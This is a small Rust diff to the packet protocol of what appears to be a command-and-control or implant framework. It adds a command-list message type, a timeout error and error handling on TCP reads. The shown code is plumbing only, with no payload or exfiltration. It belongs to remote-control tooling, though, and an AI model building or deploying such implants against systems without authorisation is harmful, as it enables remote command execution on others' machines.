@@ -1,4 +1,9 @@
-use std::{io::Read, net::TcpStream, ops::Range, time::SystemTime};
+use std::{
+    io::Read,
+    net::TcpStream,
+    ops::Range,
+    time::{Duration, SystemTime},
+};
 
 use bincode::{Decode, Encode, config};
 use sysinfo::System;
@@ -23,6 +28,7 @@ pub enum Packet {
     CommandPacket { implant_id: usize, command: String },
     ImplantCommandPacket { command: String },
     CommandResult { output: String, exit_code: i32 },
+    CommandList { commands: Vec<String> },
 }
 
 #[derive(Debug, Clone, Encode, Decode)]
@@ -48,7 +54,12 @@ pub enum PacketSerializationError {
 
 pub fn read_packet(connection: &mut TcpStream) -> Result<Packet, PacketDeserializationError> {
     let mut buf = vec![0; MAX_PACKET_SIZE_BYTES];
-    connection.read(&mut buf).unwrap();
+    // connection
+    //     .set_read_timeout(Some(Duration::from_millis(500)))
+    //     .expect("failed to set read timeout");
+    if connection.read(&mut buf).is_err() {
+        return Err(PacketDeserializationError::Timeout);
+    }
 
     decode(&buf)
 }
@@ -71,6 +82,7 @@ pub fn encode(packet: Packet) -> Result<Vec<u8>, PacketSerializationError> {
 pub enum PacketDeserializationError {
     PacketTooLong,
     DecodingError(bincode::error::DecodeError),
+    Timeout,
 }
 
 pub fn decode(bytes: &Vec<u8>) -> Result<Packet, PacketDeserializationError> {
